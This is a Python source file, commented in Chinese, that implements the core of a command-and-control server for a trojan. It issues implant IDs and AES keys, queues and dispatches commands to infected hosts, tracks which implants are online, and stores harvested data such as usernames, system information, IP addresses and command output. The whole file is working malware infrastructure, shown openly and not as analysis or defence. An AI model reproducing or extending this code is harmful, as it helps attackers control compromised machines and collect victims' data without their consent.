from base64 import b64decode
from hashlib import md5
from json import loads
from random import randint

class BaseSer():
    def __init__(self) -> None:
        self.keys_set = set() #声明一个集合用来存储随机 id 值
        self.temp_keys = set() #声明一个集合用来存储临时的随机 id 值
        self.aes_keys = dict() #声明一个字典用来存储 aes 秘钥的
        self.temp_aes_keys = dict() #声明一个字典用来临时存储 aes 秘钥的
        self.tasks_dict = dict() #声明一个字典，用来存储任务数据
        self.rst_list = list() #声明一个列表，用来存储木马执行结果
        self.online_list = list() #声明一个列表，用来存储在线主机

    def getkeys(self) -> str:
        """
        描述：
          该方法会生成一个随机的秘钥，以供木马获取并通过此秘钥与服务器进行通信

        调用方法：
          getkeys()

        返回数据：
          木马唯一身份ID:AES秘钥
        """
        if len(self.temp_keys) > 100: #限制临时 id 集合里面的无效id的数量，防止C2服务器被恶意请求，导致的集合过大，撑爆内存
            self.temp_keys.clear() #清理所有临时 id 
        if len(self.temp_aes_keys) > 100: #限制临时 aeskey 字典里面的无效秘钥数量
            self.temp_aes_keys.clear() #清理所有临时秘钥
        md5_key = md5((str((randint(1,65535)))+"pkcn").encode("utf-8")).hexdigest() #生成一个随机md5值,作为木马的唯一身份标识
        aes_key = md5((str((randint(1,65535)))+"pkcn").encode("utf-8")).hexdigest()[:16] #生成一个随机md5值,取其前8位作为加密秘钥
        self.temp_keys.add(md5_key) #{host_key}
        self.temp_aes_keys[md5_key] = aes_key #{host_key:aes_key}
        self.tasks_dict[md5_key] = {"sleeptime":"","cdm":"getlive"} #添加上线任务，木马要执行此任务才算上线
        return md5_key+":"+aes_key #host_key:aes_key

    def add_task(self,key:str,payloads:dict) -> bool:
        """
        描述：
          该方法会将用户要执行的任务封装到一个字典里面
        
        调用方法：
          add_task(木马上线时的唯一key值,{"sleeptime":沉睡时间,"cdm":要执行的命令})
        
        返回数据：
          任务添加成功返回 True 否则返回 False
        """
        if isinstance(key,str) and payloads:
            if {key} & {i for i in self.tasks_dict.keys()} == {key}:
                return False
            self.tasks_dict[key] = loads(b64decode(payloads).decode("utf-8")) #{"key值":{"sleeptime":沉睡时间,"cdm":要执行的命令}}
            return True
        else:
            return False

    def get_payloads(self,key:str) -> bool:
        """
        描述：
          该方法会根据用户提供的key值来下发对应的任务即 payload ,下发成功的 payload 将会从 self.tasks_dict 的任务列表删除

        调用方法：
          get_payloads(木马的唯一key值)
        
        返回数据：
          payload 下发成功返回对应的 payload,否则返回 False
        """
        try:
            if {key} & {i for i in self.tasks_dict.keys()} == {key}: #判断该 key 值是否有任务
                rst = self.tasks_dict.get(key) #获取 payload
                del(self.tasks_dict[key]) #删除对应任务
                return rst
            else:
                return False
        except:
            return False

    def checkpwd(self,key:str) -> bool:
        """
        描述：
          该方法是用来验证木马的唯一 key 值是否合法有效

        调用方法：
          checkpwd(木马的唯一key值)
        
        返回数据：
          验证成功返回 True 否则返回 False
        """
        if isinstance(key,str) and ({key} & self.keys_set == {key} or {key} & self.temp_keys == {key}): #通过校验key值是否在self.keys_set集合来验证其是否合法
            return True
        else:
            return False

    def add_rst(self,rst:dict) -> None:
        """
        描述：
          该方法是用来存储木马执行结果的，木马的执行结果会被存储到 self.online_list 列表中

        调用方法：
          add_rst("key":"key值","data":{"localuser":你获取到的本地用户,"sys_info":你获取到的系统信息,"local_ip":你获取到的本地IP地址,"cdm":你执行过的命令,"data":木马执行后base64位加密的结果,"remote_ip":目标的公网IP地址}})

        返回数据：
          记录结果成功则返回 True,否则返回 False
        """
        if isinstance(rst,dict):
            if rst.get("data").get("cdm") == "getlive": #判断是否为刚刚上线的木马
                if {rst.get("key")} & self.temp_keys == {rst.get("key")}: #验证其是否在临时秘钥集合里
                    self.keys_set.add(rst.get("key")) #如果验证成功，则将木马唯一id做持久化处理
                    self.temp_keys.remove(rst.get("key")) #将其从临时id集合里去除
                    self.aes_keys[rst.get("key")] = self.temp_aes_keys[rst.get("key")]
                    del self.temp_aes_keys[rst.get("key")]
                    self.online_list.append(rst) #如果是则存储到上线的列表中
                    return True
                else:
                    return False
            self.rst_list.append(rst) #不是则添加到结果列表
            return True
        else:
            return False
    
    def del_host_info(self,key:str) -> bool:
        """
        描述：
          该方法是用来删除已经上线的木马的，他会删除已存储的目标主机数据
      
        调用方法：
          del_host_info(木马的唯一key值)
      
        返回结果：
          删除目标成功返回 True ,否则返回 False
        """
        rst = False
        if isinstance(key,str) and key != "":
            if {key} & self.keys_set == {key}: #判断密钥是否有效
                self.keys_set.remove(key) #移除该密钥
                del self.aes_keys[key]
                try:
                    del self.tasks_dict[key] #查看是否有任务，有则移除
                except KeyError:
                    pass
                count = 0
                for i in self.online_list:
                    if i.get("key") == key:
                        del self.online_list[count] #从上线列表移除该目标
                        rst = True
                    count += 1
            else:
                pass
        else:
            pass
        return rst
